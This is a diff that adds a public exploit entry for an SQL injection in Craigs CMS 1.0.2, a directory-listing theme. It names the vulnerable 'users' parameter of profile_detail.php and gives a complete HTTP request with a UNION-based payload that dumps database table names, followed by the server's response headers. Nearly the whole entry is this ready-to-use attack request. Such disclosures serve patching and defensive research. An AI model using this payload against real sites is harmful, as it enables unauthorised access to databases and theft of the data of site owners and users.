@@ -1,0 +1,40 @@
+# Exploit Title: Craigs CMS 1.0.2 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://themerig.com/
+# Software Link: https://codecanyon.net/item/craigs-cms-directory-listing-theme/22431565
+# Version: 1.0.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/profile_detail.php?users=[SQL]
+# 
+
+GET /[PATH]/profile_detail.php?users=-x%27%20UNION%20SELECT+1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--%20- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=3peclhdno4t80jmagl0gurf1o4
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.6.39
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Content-Encoding: br
+Vary: Accept-Encoding
+Date: Sun, 13 Jan 2019 15:39:40 GMT
+Accept-Ranges: bytes
+Server: LiteSpeed
+Alt-Svc: quic=":443"; ma=2592000; v="35,39,43"
+Connection: close
